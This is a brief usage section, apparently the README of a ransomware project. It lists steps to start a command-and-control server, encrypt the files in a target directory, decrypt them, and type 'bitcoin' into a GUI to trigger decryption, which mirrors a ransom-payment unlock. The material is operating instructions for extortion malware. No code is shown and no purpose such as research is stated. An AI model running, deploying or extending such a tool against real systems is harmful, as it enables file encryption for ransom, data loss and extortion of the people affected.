Usage

  1. Install requirements pip install -r requirements.txt
  2. Configure secrets cp .env.example .env
  3. Start C2 server python c2_server_alt.py
  4. Encrypt files python main_v2.py -p "D:\testDir" -e
  5. Decrypt files python main_v2.py -p "D:\testDir" -d
  6. Use GUI Type bitcoin in the GUI to trigger decryption
